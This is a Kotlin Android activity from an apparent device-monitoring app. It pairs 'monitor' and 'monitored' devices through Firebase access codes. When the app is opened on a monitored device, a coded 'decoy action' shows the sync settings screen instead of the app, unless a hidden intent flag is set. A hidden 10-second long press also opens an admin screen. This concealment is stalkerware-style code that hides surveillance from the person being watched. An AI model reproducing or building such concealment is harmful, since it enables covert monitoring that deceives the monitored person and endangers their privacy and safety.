package com.jonas.x24

import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.view.MotionEvent
import android.widget.Button
import android.widget.EditText
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {

    private val longPressHandler = Handler(Looper.getMainLooper())
    private var isPressing = false
    private val longPressRunnable = Runnable {
        if (isPressing) {
            val intent = Intent(this, AdminActivity::class.java)
            startActivity(intent)
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val prefs = getSharedPreferences("x24_prefs", Context.MODE_PRIVATE)
        val savedRole = prefs.getString("ROLE", null)
        val savedKey = prefs.getString("SESSION_KEY", null)
        val bypassDecoy = intent.getBooleanExtra("bypass_decoy", false)

        if (savedRole != null && savedKey != null) {
            if (savedRole == "MONITOR") {
                val intent = Intent(this, MonitorActivity::class.java)
                intent.putExtra("SESSION_KEY", savedKey)
                startActivity(intent)
                finish()
                return
            } else if (savedRole == "BE_MONITORED") {
                if (bypassDecoy) {
                    val intent = Intent(this, BeMonitoredActivity::class.java)
                    intent.putExtra("SESSION_KEY", savedKey)
                    startActivity(intent)
                    finish()
                    return
                } else {
                    // Decoy action: Launch sync settings and finish
                    val intent = Intent(android.provider.Settings.ACTION_SYNC_SETTINGS)
                    startActivity(intent)
                    finish()
                    return
                }
            }
        }

        setContentView(R.layout.activity_main)

        val tvTitle = findViewById<TextView>(R.id.tvTitle)
        tvTitle.setOnTouchListener { _, event ->
            when (event.action) {
                MotionEvent.ACTION_DOWN -> {
                    isPressing = true
                    longPressHandler.postDelayed(longPressRunnable, 10000)
                    true
                }
                MotionEvent.ACTION_UP, MotionEvent.ACTION_CANCEL -> {
                    isPressing = false
                    longPressHandler.removeCallbacks(longPressRunnable)
                    true
                }
                else -> false
            }
        }

        val etSessionKey = findViewById<EditText>(R.id.etSessionKey)
        val btnMonitor = findViewById<Button>(R.id.btnMonitor)
        val btnBeMonitored = findViewById<Button>(R.id.btnBeMonitored)
        val progressBar = findViewById<android.widget.ProgressBar>(R.id.progressBar)

        btnMonitor.setOnClickListener {
            val key = etSessionKey.text.toString().trim()
            if (key.isEmpty()) {
                Toast.makeText(this, "Enter an access code", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }

            btnMonitor.isEnabled = false
            btnBeMonitored.isEnabled = false
            progressBar.visibility = android.view.View.VISIBLE

            val codeRef = com.google.firebase.database.FirebaseDatabase.getInstance().getReference("access_codes").child(key)
            codeRef.child("monitor_claimed").setValue(true).addOnSuccessListener {
                prefs.edit().putString("ROLE", "MONITOR").putString("SESSION_KEY", key).apply()
                val intent = Intent(this, MonitorActivity::class.java)
                intent.putExtra("SESSION_KEY", key)
                startActivity(intent)
                finish()
            }.addOnFailureListener {
                btnMonitor.isEnabled = true
                btnBeMonitored.isEnabled = true
                progressBar.visibility = android.view.View.GONE
                Toast.makeText(this, "Code invalid or monitor role already claimed", Toast.LENGTH_LONG).show()
            }
        }

        btnBeMonitored.setOnClickListener {
            val key = etSessionKey.text.toString().trim()
            if (key.isEmpty()) {
                Toast.makeText(this, "Enter an access code", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }

            btnMonitor.isEnabled = false
            btnBeMonitored.isEnabled = false
            progressBar.visibility = android.view.View.VISIBLE

            val codeRef = com.google.firebase.database.FirebaseDatabase.getInstance().getReference("access_codes").child(key)
            codeRef.runTransaction(object : com.google.firebase.database.Transaction.Handler {
                override fun doTransaction(currentData: com.google.firebase.database.MutableData): com.google.firebase.database.Transaction.Result {
                    if (currentData.value == null) {
                        return com.google.firebase.database.Transaction.abort()
                    }

                    val beMonitoredCount = currentData.child("be_monitored_count").getValue(Int::class.java) ?: 0
                    val maxMonitoredAllowed = currentData.child("max_monitored_allowed").getValue(Int::class.java) ?: 1

                    if (beMonitoredCount >= maxMonitoredAllowed) {
                        return com.google.firebase.database.Transaction.abort()
                    }

                    currentData.child("be_monitored_count").value = beMonitoredCount + 1
                    currentData.child("be_monitored_claimed").value = true // backward compat
                    return com.google.firebase.database.Transaction.success(currentData)
                }

                override fun onComplete(
                    error: com.google.firebase.database.DatabaseError?,
                    committed: Boolean,
                    currentData: com.google.firebase.database.DataSnapshot?
                ) {
                    if (committed) {
                        prefs.edit().putString("ROLE", "BE_MONITORED").putString("SESSION_KEY", key).apply()
                        val intent = Intent(this@MainActivity, BeMonitoredActivity::class.java)
                        intent.putExtra("SESSION_KEY", key)
                        startActivity(intent)
                        finish()
                    } else {
                        btnMonitor.isEnabled = true
                        btnBeMonitored.isEnabled = true
                        progressBar.visibility = android.view.View.GONE
                        Toast.makeText(this@MainActivity, "Code invalid or max monitored devices reached", Toast.LENGTH_LONG).show()
                    }
                }
            })
        }
    }
}
